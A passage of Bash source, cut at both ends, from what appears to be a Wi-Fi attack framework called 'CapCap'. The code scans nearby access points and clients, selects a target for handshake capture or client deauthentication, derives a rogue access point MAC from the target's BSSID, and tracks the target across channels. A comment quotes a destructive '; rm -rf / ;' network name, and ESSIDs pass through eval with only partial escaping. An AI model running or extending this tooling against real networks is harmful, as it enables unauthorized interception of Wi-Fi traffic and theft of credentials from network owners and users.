    "$CAPCAPWorkspacePath/dump-01.csv"
  )
  readarray CapCapTargetCandidatesClients < <(
    awk -F, "NF==7 && length(\$1)==17 && \$1~/$matchMAC/ {print \$0}" \
    "$CAPCAPWorkspacePath/dump-01.csv"
  )

  # Note: Don't cleanup dump* files yet - we need dump-01.kismet.netxml
  # for vendor lookup in capcap_get_target()

  capcap_status "SCAN_COMPLETE candidates=${#CapCapTargetCandidates[@]}"

  if [ ${#CapCapTargetCandidates[@]} -eq 0 ]; then
    # Cleanup on failure
    sandbox_remove_workfile "$CAPCAPWorkspacePath/dump*"
    echo -e "$CAPCAPVLine $CAPCAPScannerDetectedNothingNotice"
    sleep 3
    return 4
  fi
}


capcap_get_target() {
  # Assure a valid wireless interface for scanning was given.
  if [ ! "$1" ] || ! interface_is_wireless "$1"; then return 1; fi

  local -r interface=$1

  if [ "$CAPCAPAuto" ]; then
    # Auto mode: use --band if provided, otherwise infer from channel or default to 2.4GHz.
    if [ "$CAPCAPBand" ]; then
      local band="$CAPCAPBand"
    elif [ "$CapCapTargetChannel" ]; then
      local band=""
      local firstChannel=$(echo "$CapCapTargetChannel" | grep -oE '[0-9]+' | head -1)
      if [ -n "$firstChannel" ] && [ "$firstChannel" -le 14 ]; then
        band="bg"
      else
        band="a"
      fi
    else
      local band="bg"
    fi
    capcap_target_get_candidates $interface "$CapCapTargetChannel" "$band"

    # Abort if errors occured while searching for candidates.
    if [ $? -ne 0 ]; then return 2; fi
  else
    # Loop the channel selection so a scan that finds no access points
    # returns the user to this prompt (the previous step) instead of
    # aborting all the way back to the attack-selection menu.
    while true; do
    interface_bands "$interface" 2>/dev/null
    local __ifBands="${InterfaceBands:-unknown}"
    local choices=()
    if [[ "$__ifBands" == *"2.4GHz"* ]]; then
      choices+=("$CAPCAPScannerChannelOptionAll (2.4GHz)")
    fi
    if [[ "$__ifBands" == *"5GHz"* ]]; then
      choices+=("$CAPCAPScannerChannelOptionAll (5GHz)")
    fi
    if [[ "$__ifBands" == *"2.4GHz"* ]] && [[ "$__ifBands" == *"5GHz"* ]]; then
      choices+=("$CAPCAPScannerChannelOptionAll (2.4GHz & 5Ghz)")
    fi
    if [ ${#choices[@]} -eq 0 ]; then
      choices+=( \
        "$CAPCAPScannerChannelOptionAll (2.4GHz)" \
        "$CAPCAPScannerChannelOptionAll (5GHz)" \
        "$CAPCAPScannerChannelOptionAll (2.4GHz & 5Ghz)" \
      )
    fi
    choices+=("$CAPCAPScannerChannelOptionSpecific" "$CAPCAPGeneralBackOption")

    io_query_choice "$CAPCAPScannerChannelQuery" choices[@]

    echo

    case "$IOQueryChoice" in
      "$CAPCAPScannerChannelOptionAll (2.4GHz)")
        capcap_target_get_candidates $interface "" "bg";;

      "$CAPCAPScannerChannelOptionAll (5GHz)")
        capcap_target_get_candidates $interface "" "a";;

      "$CAPCAPScannerChannelOptionAll (2.4GHz & 5Ghz)")
        capcap_target_get_candidates $interface "" "abg";;

      "$CAPCAPScannerChannelOptionSpecific")
        capcap_header

        echo -e "$CAPCAPVLine $CAPCAPScannerChannelQuery"
        echo
        echo -e "     $CAPCAPScannerChannelSingleTip ${CBlu}6$CClr               "
        echo -e "     $CAPCAPScannerChannelMiltipleTip ${CBlu}1-5$CClr             "
        echo -e "     $CAPCAPScannerChannelMiltipleTip ${CBlu}1,2,5-7,11$CClr      "
        echo
        echo -ne "$CAPCAPPrompt"

        local channels
        read channels

        echo

        # Determine band based on channel number
        # Channels 1-14 are 2.4GHz (band bg), 36+ are 5GHz (band a)
        local band=""
        local firstChannel=$(echo "$channels" | grep -oE '[0-9]+' | head -1)
        if [ -n "$firstChannel" ]; then
          if [ "$firstChannel" -le 14 ]; then
            band="bg"
          else
            band="a"
          fi
        fi

        capcap_target_get_candidates $interface $channels "$band";;

      "$CAPCAPGeneralBackOption")
        return -1;;
    esac

    local scanStatus=$?

    # No access points detected: re-prompt the channel selection above.
    # (capcap_target_get_candidates already told the user nothing found.)
    if [ "$scanStatus" -eq 4 ]; then continue; fi

    # Any other scanner error aborts target selection.
    if [ "$scanStatus" -ne 0 ]; then return 2; fi

    break
    done
  fi

  local candidatesMAC=()
  local candidatesClientsCount=()
  local candidatesChannel=()
  local candidatesSecurity=()
  local candidatesSignal=()
  local candidatesPower=()
  local candidatesESSID=()
  local candidatesColor=()
  local candidatesVendor=()
  local candidatesHandshake=()

  # Build list of BSSIDs that already have valid handshakes
  local -A existingHandshakes
  local -r handshakeDir="$CAPCAPPath/attacks/Handshake Snooper/handshakes"
  if [ -d "$handshakeDir" ]; then
    local handshakeFile
    for handshakeFile in "$handshakeDir"/*.cap; do
      if [ -f "$handshakeFile" ] && [ -s "$handshakeFile" ]; then
        # Extract BSSID from filename (format: *<BSSID>.cap)
        local filename=$(basename "$handshakeFile")
        # Match MAC address pattern at end before .cap
        if [[ "$filename" =~ ([A-F0-9]{2}:[A-F0-9]{2}:[A-F0-9]{2}:[A-F0-9]{2}:[A-F0-9]{2}:[A-F0-9]{2})\.cap$ ]]; then
          local bssid="${BASH_REMATCH[1]}"
          # Store both uppercase and lowercase versions for matching
          existingHandshakes["${bssid^^}"]=1
          existingHandshakes["${bssid,,}"]=1
        fi
      fi
    done
  fi

  # Build vendor lookup table from kismet netxml file if it exists
  local -A vendorLookup
  if [ -f "$CAPCAPWorkspacePath/dump-01.kismet.netxml" ]; then
    # Extract MAC and manuf pairs from netxml file
    # Each wireless-network block has <BSSID> followed by <manuf>
    while IFS= read -r line; do
      if [[ "$line" =~ \<BSSID\>([A-F0-9:]+)\</BSSID\> ]]; then
        local currentMAC="${BASH_REMATCH[1]}"
      elif [[ "$line" =~ \<manuf\>(.+)\</manuf\> ]] && [ -n "$currentMAC" ]; then
        local manufName="${BASH_REMATCH[1]}"
        # Decode HTML entities (e.g., &amp; -> &)
        manufName=$(echo "$manufName" | sed 's/&amp;/\&/g; s/&lt;/</g; s/&gt;/>/g; s/&quot;/"/g')
        vendorLookup["$currentMAC"]="$manufName"
        currentMAC=""
      fi
    done < "$CAPCAPWorkspacePath/dump-01.kismet.netxml"
  fi

  # Gather information from all the candidates detected.
  # TODO: Clean up this for loop using a cleaner algorithm.
  # Maybe try using array appending & [-1] for last elements.
  local filteredCount=0
  for candidateAPInfo in "${CapCapTargetCandidates[@]}"; do
    # Strip candidate info from any extraneous spaces after commas.
    candidateAPInfo=$(echo "$candidateAPInfo" | sed -r "s/,\s*/,/g")

    local candidateMAC=$(echo "$candidateAPInfo" | cut -d , -f 1)
    
    # For Handshake Snooper: skip networks with existing handshakes
    # For other attacks: mark them but don't skip
    if [ -n "${existingHandshakes[$candidateMAC]}" ]; then
      if [ "$CapCapAttack" = "Handshake Snooper" ]; then
        ((filteredCount++))
        continue
      fi
    fi

    local i=${#candidatesMAC[@]}

    candidatesMAC[i]="$candidateMAC"
    
    # Look up vendor from kismet netxml file first, fallback to macchanger
    if [ -n "${vendorLookup[${candidatesMAC[i]}]}" ]; then
      local vendor="${vendorLookup[${candidatesMAC[i]}]}"
      # Don't show "Unknown" vendors - leave empty instead
      if [ "$vendor" != "Unknown" ]; then
        candidatesVendor[i]="$vendor"
      else
        candidatesVendor[i]=""
      fi
    else
      # Fallback to macchanger OUI lookup
      local makerID=${candidatesMAC[i]:0:8}
      candidatesVendor[i]=$(
        macchanger -l 2>/dev/null |
        grep -i "${makerID,,}" |
        cut -d ' ' -f 5- |
        head -n 1
      )
      # Leave empty if no vendor found (don't show "Unknown")
    fi
    candidatesClientsCount[i]=$(
      echo "${CapCapTargetCandidatesClients[@]}" |
      grep -c "${candidatesMAC[i]}"
    )
    local __ch=$(echo "$candidateAPInfo" | cut -d , -f 4 | tr -d ' ')
    if [ "$__ch" -ge 52 -a "$__ch" -le 64 ] 2>/dev/null || \
       [ "$__ch" -ge 100 -a "$__ch" -le 144 ] 2>/dev/null; then
      candidatesChannel[i]="${__ch}!"
    else
      candidatesChannel[i]="$__ch"
    fi
    candidatesSecurity[i]=$(echo "$candidateAPInfo" | cut -d , -f 6)
    candidatesPower[i]=$(echo "$candidateAPInfo" | cut -d , -f 9)
    candidatesColor[i]=$(
      [ ${candidatesClientsCount[i]} -gt 0 ] && echo $CGrn || echo $CClr
    )

    # Parse any non-ascii characters by letting bash handle them.
    # Escape all single quotes in ESSID and let bash's $'...' handle it.
    local sanitizedESSID=$(
      echo "${candidateAPInfo//\'/\\\'}" | cut -d , -f 14
    )
    candidatesESSID[i]=$(eval "echo \$'$sanitizedESSID'")
    
    # Mark networks with existing handshakes with asterisk
    if [ "$CapCapAttack" != "Handshake Snooper" ] && [ -n "${existingHandshakes[$candidateMAC]}" ]; then
      candidatesHandshake[i]="*"
    else
      candidatesHandshake[i]=" "
    fi

    local power=${candidatesPower[i]}
    if [ $power -eq -1 ]; then
      # airodump-ng's man page says -1 means unsupported value.
      candidatesQuality[i]="??"
    elif [ $power -le $CAPCAPNoiseFloor ]; then
      candidatesQuality[i]=0
    elif [ $power -gt $CAPCAPNoiseCeiling ]; then
      candidatesQuality[i]=100
    else
      # Bash doesn't support floating point division, work around it...
      # Q = ((P - F) / (C - F)); Q-quality, P-power, F-floor, C-Ceiling.
      candidatesQuality[i]=$(( \
        (${candidatesPower[i]} * 10 - $CAPCAPNoiseFloor * 10) / \
        (($CAPCAPNoiseCeiling - $CAPCAPNoiseFloor) / 10) \
      ))
    fi
  done

  # Check if all networks were filtered out
  if [ ${#candidatesMAC[@]} -eq 0 ]; then
    local emptyMessage=""
    if [ $filteredCount -gt 0 ]; then
      # shellcheck disable=SC2059
      emptyMessage="${CYel}$(printf "${CAPCAPTargetListEmptyFiltered:-Every network on this channel already has a handshake.}")$CClr\n"
      emptyMessage+="${CYel}${CAPCAPTargetListEmptyFilteredHint:-Scan another channel first.}$CClr\n\n"
    else
      emptyMessage="${CRed}${CAPCAPTargetListEmptyNone:-No networks were found on this channel.}$CClr\n\n"
    fi

    local choices=("$CAPCAPGeneralBackOption")
    io_query_choice "$emptyMessage" choices[@]
    return 1
  fi

  format_center_literals "${CAPCAPTargetListTitle:-WIFI LIST}"
  local headerTitle="$FormatCenterLiterals\n\n"

  # Explain the table before showing it: the colour of a row carries meaning
  # and nothing on screen said what that meaning was. Each legend line is only
  # printed when at least one row actually shows that marker.
  local __hasClients="" __hasHandshake="" __hasDFS=""
  local __chk __chkHandshake
  local __chkIndex
  for __chkIndex in "${!candidatesMAC[@]}"; do
    [ "${candidatesClientsCount[__chkIndex]}" -gt 0 ] && __hasClients=1
    [ "${candidatesChannel[__chkIndex]}" != "${candidatesChannel[__chkIndex]//!/}" ] && __hasDFS=1
    [ "${candidatesHandshake[__chkIndex]}" = "*" ] && __hasHandshake=1
  done
  # printf %b because the literal "\e[..m" colour sequences in the locale
  # strings are expanded later by echo -e, and a command substitution would eat
  # the trailing newline and run all three lines together.
  local __legendLine=""
  if [ "$__hasClients" ]; then
    printf -v __legendLine "%b\n" "${CAPCAPTargetListLegendClients:-Green rows: at least one device is connected.}$CClr"
    headerTitle+="$__legendLine"
  fi
  if [ "$__hasHandshake" ]; then
    printf -v __legendLine "%b\n" "${CAPCAPTargetListLegendHandshake:-*: a saved handshake exists.}$CClr"
    headerTitle+="$__legendLine"
  fi
  if [ "$__hasDFS" ]; then
    printf -v __legendLine "%b\n" "${CAPCAPTargetListLegendDFS:-!: DFS channel.}$CClr"
    headerTitle+="$__legendLine"
  fi
  [ "$__hasClients$__hasHandshake$__hasDFS" ] && headerTitle+="\n"

  if [ $filteredCount -gt 0 ]; then
    # shellcheck disable=SC2059
    headerTitle+="${CBRed}$(printf "${CAPCAPTargetListFilteredNotice:-%s network(s) were hidden}" "$filteredCount")$CClr\n\n"
  fi

  headerTitle+="${CAPCAPTargetListColumns:-}"$'\n\n'

  local __essidMaxLen=5
  local __essidEntry
  for __essidEntry in "${candidatesESSID[@]}"; do
    [ ${#__essidEntry} -gt $__essidMaxLen ] && __essidMaxLen=${#__essidEntry}
  done
  local __vendorMaxLen=6
  local __vendorEntry
  for __vendorEntry in "${candidatesVendor[@]}"; do
    [ ${#__vendorEntry} -gt $__vendorMaxLen ] && __vendorMaxLen=${#__vendorEntry}
  done

  # Drop the VENDOR column rather than let every row wrap in a narrow window:
  # it is the least useful column when picking a target, and a wrapped table is
  # unreadable. 56 is the fixed width of [nnn] plus the other eight columns.
  local __terminalWidth=80
  local __reportedWidth
  __reportedWidth=$(tput cols 2>/dev/null) || __reportedWidth=""
  if [ -n "$__reportedWidth" ] && [ "$__reportedWidth" -gt 40 ] 2>/dev/null; then
    __terminalWidth=$__reportedWidth
  fi
  local __showVendor=1
  if [ $(( 56 + __essidMaxLen + 1 + __vendorMaxLen )) -gt $__terminalWidth ]; then
    __showVendor=0
  fi
  local __vendorHeader=""
  local __vendorFormat=""
  local __vendorArgs=()
  if [ "$__showVendor" = 1 ]; then
    __vendorHeader=" %-${__vendorMaxLen}s"
    __vendorFormat=" %-${__vendorMaxLen}.${__vendorMaxLen}s"
    __vendorArgs=("VENDOR")
  fi

  local -r headerFields=$(
    # shellcheck disable=SC2059
    printf "$CRed[$CSYel ** $CClr$CRed]$CClr %2s %-${__essidMaxLen}s %4s %3s %3s %4s %-8s %-17s${__vendorHeader}\n" \
      "HS" "ESSID" "QLTY" "PWR" "STA" "CH" "SECURITY" "BSSID" "${__vendorArgs[@]}"
  )

  local -r __dataFormat="$CRed[$CSYel%03d$CClr$CRed]%b  %2s %-${__essidMaxLen}.${__essidMaxLen}s %3s%% %3s %3d %4s %-8.8s %-17s${__vendorFormat}\n"
  FormatApplyAutosize="$__dataFormat"

  if [ "$CAPCAPAuto" ]; then
    # Auto mode: select target matching -b/-e flags, or first available.
    local autoTargetIndex=0
    if [ "$CapCapTargetMAC" ] || [ "$CapCapTargetSSID" ]; then
      local ti
      for ti in "${!candidatesMAC[@]}"; do
        if [ "$CapCapTargetMAC" ] && \
          [ "${candidatesMAC[ti],,}" = "${CapCapTargetMAC,,}" ]; then
          autoTargetIndex=$ti; break
        fi
        if [ "$CapCapTargetSSID" ] && \
          [ "${candidatesESSID[ti]}" = "$CapCapTargetSSID" ]; then
          autoTargetIndex=$ti; break
        fi
      done
    fi

    CapCapTargetMAC=${candidatesMAC[$autoTargetIndex]}
    CapCapTargetSSID=${candidatesESSID[$autoTargetIndex]}
    CapCapTargetChannel=${candidatesChannel[$autoTargetIndex]//!/}
    capcap_status "TARGET_SELECTED ssid=$CapCapTargetSSID bssid=$CapCapTargetMAC channel=$CapCapTargetChannel"
  else
    # The vendor column is only requested when it is being displayed, so the
    # array list and the target indices stay in step.
    local __listVarArgs=(
      candidatesColor[@]
      candidatesHandshake[@]
      candidatesESSID[@]
      candidatesQuality[@]
      candidatesPower[@]
      candidatesClientsCount[@]
      candidatesChannel[@]
      candidatesSecurity[@]
      candidatesMAC[@]
    )
    if [ "$__showVendor" = 1 ]; then
      __listVarArgs+=(candidatesVendor[@])
    fi

    # shellcheck disable=SC2086  # The array names are dereferenced by the callee.
    io_query_format_fields "$headerTitle$headerFields" \
      "$FormatApplyAutosize" \
      "${__listVarArgs[@]}"

    echo

    CapCapTargetMAC=${IOQueryFormatFields[8]}
    CapCapTargetSSID=${IOQueryFormatFields[2]}
    CapCapTargetChannel=${IOQueryFormatFields[6]//!/}
  fi

  if [ "$CAPCAPAuto" ]; then
    CapCapTargetEncryption=${candidatesSecurity[$autoTargetIndex]}
    CapCapTargetMaker=${candidatesVendor[$autoTargetIndex]}
  else
    CapCapTargetEncryption=${IOQueryFormatFields[7]}
    # Get vendor from the selection; the column is absent in narrow terminals,
    # in which case the macchanger lookup below fills it in.
    CapCapTargetMaker="${IOQueryFormatFields[9]:-}"
  fi

  # Cleanup airodump-ng output files after vendor lookup is complete
  sandbox_remove_workfile "$CAPCAPWorkspacePath/dump*"

  CapCapTargetMakerID=${CapCapTargetMAC:0:8}
  
  # If vendor wasn't found in kismet/list, fallback to macchanger lookup
  if [ -z "$CapCapTargetMaker" ]; then
    CapCapTargetMaker=$(
      macchanger -l |
      grep ${CapCapTargetMakerID,,} 2>> $CAPCAPOutputDevice |
      cut -d ' ' -f 5-
    )
  fi

  CapCapTargetSSIDClean=$(capcap_target_normalize_SSID)

  # We'll change a single hex digit from the target AP's MAC address.
  # This new MAC address will be used as the rogue AP's MAC address.
  local -r rogueMACHex=$(printf %02X $((0x${CapCapTargetMAC:13:1} + 1)))
  CapCapTargetRogueMAC="${CapCapTargetMAC::13}${rogueMACHex:1:1}${CapCapTargetMAC:14:4}"
}

capcap_target_normalize_SSID() {
  # Sanitize network ESSID to make it safe for manipulation.
  # Notice: Why remove these? Some smartass might decide to name their
  # network "; rm -rf / ;". If the string isn't sanitized accidentally
  # shit'll hit the fan and we'll have an extremly distressed user.
  # Replacing ' ', '/', '.', '~', '\' with '_'
  echo "$CapCapTargetSSID" | sed -r 's/( |\/|\.|\~|\\)+/_/g'
}

capcap_target_show() {
  format_apply_autosize "%*s$CBlu%7s$CClr: %-32s%*s\n"

  local colorlessFormat="$FormatApplyAutosize"
  local colorfullFormat=$(
    echo "$colorlessFormat" | sed -r 's/%-32s/%-32b/g'
  )

  printf "$colorlessFormat" "" "ESSID" "\"${CapCapTargetSSID:-[N/A]}\" / ${CapCapTargetEncryption:-[N/A]}" ""
  printf "$colorlessFormat" "" "Channel" " ${CapCapTargetChannel:-[N/A]}" ""
  printf "$colorfullFormat" "" "BSSID" " ${CapCapTargetMAC:-[N/A]} ($CYel${CapCapTargetMaker:-[N/A]}$CClr)" ""

  echo

  # WPA3/SAE protects management frames (PMF), so deauth frames are discarded
  # by the client and it stays associated. Say that before the user spends
  # time wondering why the phone never drops.
  local -u __target_enc="${CapCapTargetEncryption:-}"
  if [[ "$__target_enc" == *WPA3* || "$__target_enc" == *SAE* ]]; then
    echo -e "$CAPCAPVLine ${CYel}$CAPCAPTargetPMFWarning$CClr"
    echo
  fi
}


capcap_target_scan_clients() {
  local -r interface=$1
  local -r bssid=$2
  local -r channel=$3

  CapCapTargetClientsMAC=()
  CapCapTargetClientsPower=()
  CapCapTargetClientsVendor=()

  if [ ! "$interface" ] || ! interface_is_wireless "$interface"; then return 1; fi
  if [ ! "$bssid" ] || [ ! "$channel" ]; then return 1; fi

  local currentMode=$(iw dev "$interface" info 2>/dev/null | grep -oP 'type \K\w+')
  if [ "$currentMode" != "monitor" ]; then
    interface_set_mode "$interface" monitor &>> $CAPCAPOutputDevice
    sleep 1
  fi

  sandbox_remove_workfile "$CAPCAPWorkspacePath/clientdump*"

  local -r scanCmd="airodump-ng -a --bssid $bssid -c $channel -w \"$CAPCAPWorkspacePath/clientdump\" $interface"

  if [ "$CAPCAPAuto" ]; then
    local scannerPID
    capcap_window_open scannerPID "$CAPCAPClientScannerHeader" \
      "$TOPLEFTBIG" "#000000" "#FFFFFF" "$scanCmd"
    sleep "$CAPCAPScanTime"
    capcap_window_close scannerPID
    sleep 1
  else
    if ! capcap_window_open "" "$CAPCAPClientScannerHeader" \
      "$TOPLEFTBIG" "#000000" "#FFFFFF" "$scanCmd" 2>> $CAPCAPOutputDevice; then
      echo -e "$CAPCAPVLine$CRed $CAPCAPGeneralXTermFailureError"
      sleep 3
      return 2
    fi
  fi

  if [ ! -f "$CAPCAPWorkspacePath/clientdump-01.csv" ]; then
    sandbox_remove_workfile "$CAPCAPWorkspacePath/clientdump*"
    return 3
  fi

  local -r matchMAC="([A-F0-9][A-F0-9]:)+[A-F0-9][A-F0-9]"
  local stationMAC stationPower
  while IFS=, read -r stationMAC stationPower; do
    [ "$stationMAC" ] || continue
    local i=${#CapCapTargetClientsMAC[@]}
    CapCapTargetClientsMAC[i]="$stationMAC"
    CapCapTargetClientsPower[i]="$stationPower"
    local makerID=${stationMAC:0:8}
    CapCapTargetClientsVendor[i]=$(
      macchanger -l 2>/dev/null |
      grep -i "${makerID,,}" |
      cut -d ' ' -f 5- |
      head -n 1
    )
  done < <(
    awk -F, -v bssid="${bssid^^}" '
      {
        mac = $1; power = $4; associated = $6;
        gsub(/ /, "", mac); gsub(/ /, "", power); gsub(/ /, "", associated);
        if (length(mac) == 17 && mac ~ /'"$matchMAC"'/ && toupper(associated) == bssid)
          print mac "," power;
      }' "$CAPCAPWorkspacePath/clientdump-01.csv"
  )

  sandbox_remove_workfile "$CAPCAPWorkspacePath/clientdump*"

  CapCapTargetClientsScanned="${bssid^^}:$channel"

  if [ ${#CapCapTargetClientsMAC[@]} -eq 0 ]; then return 4; fi
}

capcap_target_select_clients() {
  local -r resultVar=$1
  local -r broadcastCapable=${2:-1}
  printf -v "$resultVar" '%s' ""

  local allOption="$CAPCAPTargetClientsAllOption"
  local bulkOption bulkToken
  if [ "$broadcastCapable" = "1" ]; then
    bulkOption="$CAPCAPTargetClientsBroadcastOption"
    bulkToken="broadcast"
  else
    allOption="$CAPCAPTargetClientsAllLiveOption"
    bulkOption="$allOption"
    bulkToken="all"
  fi

  local -r clientCount=${#CapCapTargetClientsMAC[@]}
  if [ $clientCount -eq 0 ]; then
    capcap_header

    echo -e "$CAPCAPVLine $CAPCAPTargetClientsDetectedNothingNotice"
    echo

    local noClientChoices=(
      "$bulkOption"
      "$CAPCAPGeneralBackOption"
    )
    io_query_choice "" noClientChoices[@]

    if [ "$IOQueryChoice" = "$CAPCAPGeneralBackOption" ]; then
      return 1
    fi

    printf -v "$resultVar" '%s' "$bulkToken"
    return 0
  fi

  capcap_header

  echo -e "$CAPCAPVLine $CAPCAPTargetClientsListNotice"
  echo

  local i
  for i in "${!CapCapTargetClientsMAC[@]}"; do
    printf "    $CRed[$CSYel%03d$CClr$CRed]$CClr %4s dBm  %-17s  %s\n" \
      "$((i + 1))" \
      "${CapCapTargetClientsPower[i]}" \
      "${CapCapTargetClientsMAC[i]}" \
      "${CapCapTargetClientsVendor[i]}"
  done
  echo
  printf "    $CRed[$CSYel%3s$CClr$CRed]$CClr %s\n" "a" "$allOption"
  if [ "$broadcastCapable" = "1" ]; then
    printf "    $CRed[$CSYel%3s$CClr$CRed]$CClr %s\n" "*" "$CAPCAPTargetClientsBroadcastOption"
  fi
  printf "    $CRed[$CSYel%3s$CClr$CRed]$CClr %b\n" "0" "$CAPCAPGeneralBackOption"
  echo

  local query="$CAPCAPTargetClientsQuery"
  if [ "$broadcastCapable" != "1" ]; then
    query="$CAPCAPTargetClientsDirectedQuery"
  fi

  local selection
  while true; do
    echo -ne "$CAPCAPVLine $query\n$IOUtilsPrompt"
    read selection

    if [ "$selection" = "0" ]; then
      return 1
    fi

    if [ -z "$selection" ] || [ "$selection" = "a" ] || [ "$selection" = "A" ]; then
      printf -v "$resultVar" '%s' "all"
      return 0
    fi

    if [ "$selection" = "*" ] && [ "$broadcastCapable" = "1" ]; then
      printf -v "$resultVar" '%s' "broadcast"
      return 0
    fi

    local valid=1
    local token
    local macList=""
    for token in ${selection//,/ }; do
      if ! [[ "$token" =~ ^[0-9]+$ ]] ||
        [ "$token" -lt 1 ] || [ "$token" -gt $clientCount ]; then
        valid=0
        break
      fi
      macList+="${CapCapTargetClientsMAC[$((token - 1))]} "
    done

    if [ $valid -eq 1 ] && [ "$macList" ]; then
      printf -v "$resultVar" '%s' "${macList% }"
      return 0
    fi
  done
}
capcap_target_tracker_daemon() {
  if [ ! "$1" ]; then return 1; fi # Assure we've got capcap's PID.

  readonly capcapPID=$1
  readonly monitorTimeout=10 # In seconds.
  readonly capturePath="$CAPCAPWorkspacePath/tracker_capture"

  echo "[T-Tracker] === DAEMON STARTED ===" >> $CAPCAPOutputDevice
  echo "[T-Tracker] CapWifi PID: $capcapPID" >> $CAPCAPOutputDevice
  echo "[T-Tracker] Tracker Interface: $CapCapTargetTrackerInterface" >> $CAPCAPOutputDevice
  echo "[T-Tracker] Target MAC: $CapCapTargetMAC" >> $CAPCAPOutputDevice
  echo "[T-Tracker] Target SSID: $CapCapTargetSSID" >> $CAPCAPOutputDevice
  echo "[T-Tracker] Current Channel: $CapCapTargetChannel" >> $CAPCAPOutputDevice

  if [ \
    -z "$CapCapTargetMAC" -o \
    -z "$CapCapTargetSSID" -o \
    -z "$CapCapTargetChannel" ]; then
    echo "[T-Tracker] ERROR: Missing target info, aborting." >> $CAPCAPOutputDevice
    return 2 # If we're missing target information, we can't track properly.
  fi

  local apPresent=1 # 1 = AP visible, 0 = AP not visible.

  while true; do
    echo "[T-Tracker] Scanning all channels for $monitorTimeout seconds..." >> $CAPCAPOutputDevice
    # Use --band abg to scan all 2.4GHz and 5GHz channels to detect channel hopping
    # Redirect stdin from /dev/null to prevent SIGTTIN stopping the background process
    timeout $monitorTimeout airodump-ng --band abg -aw "$capturePath" \
      -d "$CapCapTargetMAC" $CapCapTargetTrackerInterface </dev/null &>/dev/null
    local error=$? # Catch the returned status error code.

    echo "[T-Tracker] airodump-ng exited with code: $error" >> $CAPCAPOutputDevice

    # Exit code 124 means timeout expired (expected), 143 means SIGTERM (also from timeout)
    # Only abort on unexpected errors (not 0, 124, or 143)
    if [ $error -ne 0 ] && [ $error -ne 124 ] && [ $error -ne 143 ]; then
      echo -e "[T-Tracker] ${CRed}Error:$CClr Operation aborted (code: $error)!" >> $CAPCAPOutputDevice
      break
    fi

    local targetInfo=$(head -n 3 "$capturePath-01.csv" 2>/dev/null | tail -n 1)
    sandbox_remove_workfile "$capturePath-*"

    local targetChannel=$(
      echo "$targetInfo" | awk -F, '{gsub(/ /, "", $4); print $4}'
    )

    echo "[T-Tracker] Raw info: $targetInfo" >> $CAPCAPOutputDevice
    echo "[T-Tracker] Detected channel: '$targetChannel' (expected: '$CapCapTargetChannel')" >> $CAPCAPOutputDevice

    # Detect presence/absence transitions and signal the parent.
    if [ -z "$targetChannel" ] || [ "$targetChannel" = "-1" ]; then
      echo "[T-Tracker] Target not found or channel invalid, retrying..." >> $CAPCAPOutputDevice
      if [ $apPresent -ne 0 ]; then
        apPresent=0
        echo "[T-Tracker] AP disappeared — signalling pause." >> $CAPCAPOutputDevice
        kill -SIGUSR1 $capcapPID 2>/dev/null
      fi
      continue
    fi

    # AP is visible — signal resume if it was previously absent.
    if [ $apPresent -eq 0 ]; then
      apPresent=1
      echo "[T-Tracker] AP reappeared — signalling resume." >> $CAPCAPOutputDevice
      kill -SIGUSR2 $capcapPID 2>/dev/null
    fi

    if [ "$targetChannel" -ne "$CapCapTargetChannel" ] 2>/dev/null; then
      echo "[T-Tracker] !!! CHANNEL CHANGE DETECTED: $CapCapTargetChannel -> $targetChannel !!!" >> $CAPCAPOutputDevice
      CapCapTargetChannel=$targetChannel
      break
    fi

    echo "[T-Tracker] Channel unchanged, continuing to monitor..." >> $CAPCAPOutputDevice

    # NOTE: We might also want to check for SSID changes here, assuming the only
    # thing that remains constant is the MAC address. The problem with that is
    # that airodump-ng has some serious problems with unicode, apparently.
    # Try feeding it an access point with Chinese characters and check the .csv.
  done

  # Save/overwrite the new target information to the workspace for retrival.
  echo "$CapCapTargetMAC" > "$CAPCAPWorkspacePath/target_info.txt"
  echo "$CapCapTargetSSID" >> "$CAPCAPWorkspacePath/target_info.txt"
  echo "$CapCapTargetChannel" >> "$CAPCAPWorkspacePath/target_info.txt"

  # NOTICE: Using different signals for different things is a BAD idea.
  # We should use a single signal, SIGINT, to handle different situations.
  kill -s SIGALRM $capcapPID # Signal capcap a change was detected.

  sandbox_remove_workfile "$capturePath-*"
}

capcap_target_tracker_stop() {
  if [ ! "$CapCapTargetTrackerDaemonPID" ]; then return 1; fi
  kill -s SIGABRT $CapCapTargetTrackerDaemonPID &> /dev/null
  CapCapTargetTrackerDaemonPID=""
}

capcap_target_tracker_start() {
  if [ ! "$CapCapTargetTrackerInterface" ]; then
    return 1
  fi

  capcap_target_tracker_daemon $$ &>> $CAPCAPOutputDevice &
  CapCapTargetTrackerDaemonPID=$!
}

capcap_target_unset_tracker() {
  if [ ! "$CapCapTargetTrackerInterface" ]; then return 1; fi

  # Deallocate the interface from CapCapInterfaces so it can be reused.
  capcap_deallocate_interface "$CapCapTargetTrackerInterface" 2>/dev/null

  CapCapTargetTrackerInterface=""
}

capcap_target_set_tracker() {
  if [ "$CapCapTargetTrackerInterface" ]; then
    echo "Tracker interface already set, skipping." >> $CAPCAPOutputDevice
    return 0
  fi

  # Check if attack provides tracking interfaces, get & set one.
  if ! type -t attack_tracking_interfaces &> /dev/null; then
    echo "Tracker DOES NOT have interfaces available!" >> $CAPCAPOutputDevice
    return 1
  fi

  if [ "$CapCapTargetTrackerInterface" == "" ]; then
    echo "Running get interface (tracker)." >> $CAPCAPOutputDevice
    if [ "$CAPCAPAuto" ]; then
      if [ "$CAPCAPTrackerInterface" ]; then
        CapCapInterfaceSelected="$CAPCAPTrackerInterface"
      else
        # Auto mode: skip tracker unless --tracker-interface is specified.
        CapCapTargetTrackerInterface=""
        return 0
      fi
    else
      local -r interfaceQuery=$CAPCAPTargetTrackerInterfaceQuery
      local -r interfaceQueryTip=$CAPCAPTargetTrackerInterfaceQueryTip
      local -r interfaceQueryTip2=$CAPCAPTargetTrackerInterfaceQueryTip2
      if ! capcap_get_interface attack_tracking_interfaces \
        "$interfaceQuery\n$CAPCAPVLine $interfaceQueryTip\n$CAPCAPVLine $interfaceQueryTip2"; then
        echo "Failed to get tracker interface!" >> $CAPCAPOutputDevice
        return 2
      fi
    fi
    local selectedInterface=$CapCapInterfaceSelected
  else
    # Assume user passed one via the command line and move on.
    # If none was given we'll take care of that case below.
    local selectedInterface=$CapCapTargetTrackerInterface
    echo "Tracker interface passed via command line!" >> $CAPCAPOutputDevice
  fi

  # If user skipped a tracker interface, move on.
  if [ ! "$selectedInterface" ]; then
    capcap_target_unset_tracker
    return 0
  fi

  # Guard the CLI/auto path: an interface supplied via --tracker-interface
  # bypasses the interactive candidate filter (attack_tracking_interfaces),
